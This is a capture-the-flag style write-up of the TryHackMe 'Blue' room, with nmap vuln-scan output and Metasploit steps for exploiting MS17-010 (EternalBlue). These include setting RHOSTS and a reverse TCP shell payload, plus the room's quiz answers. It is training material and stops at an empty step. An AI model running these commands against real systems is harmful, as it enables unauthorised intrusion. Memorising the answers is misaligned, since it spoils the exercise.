# Blue

- [Tools](#tools)
- [Recon](#recon)
- [Gain Access](#gain-access)

Room Link: https://tryhackme.com/room/blue

## Tools 

1. NMap https://nmap.org/download
2. Metasploit https://www.metasploit.com/download

## Recon

1. Scan with nmap using command, `nmap 10.10.248.180 --script vuln -p0-1000`

Output:
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-27 10:57 IST
Nmap scan report for 10.10.248.180
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: ERROR: Script execution failed (use -d to debug)
|_smb-double-pulsar-backdoor: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-conficker: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
```
2. Question `How many ports are open with a port number under 1000?` Answer `3`
3. Question `What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)` Answer `ms17-010`

## Gain Access

1. Start Metasploit with `msfconsole`
2. Following next question, searched exploit in metasploit console with `search ms17-010` command
Output:
```bash
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
3. Question `Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)` Ansswer `exploit/windows/smb/ms17_010_eternalblue`
4. To use the exploit we typed `use exploit/windows/smb/ms17_010_eternalblue` command
5. After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` command
6. Question `Show options and set the one required value. What is the name of this value? (All caps for submission)` Answer `RHOSTS`
7. Used payload with command `set payload windows/x64/shell/reverse_tcp`
8. 


Author: Zishan Ahamed Thandar
